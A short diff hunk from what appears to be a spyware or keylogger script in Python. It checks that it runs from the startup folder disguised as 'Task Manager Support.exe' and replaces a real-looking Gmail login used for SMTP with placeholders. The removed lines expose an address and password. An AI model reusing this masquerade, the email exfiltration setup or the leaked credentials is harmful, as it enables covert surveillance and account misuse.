@@ -35,8 +35,8 @@ if currentpath!=(tostartup+'\Task Manager Support.exe'):
     sys.exit()
 
 #######################################
-gmail_user = 'yagcat@gmail.com'
-gmail_pwd = 'yagcat00'
+gmail_user = 'xxx@gmail.com'
+gmail_pwd = 'xxxxxx'
 server = 'smtp.gmail.com'
 server_port = 587
 #######################################
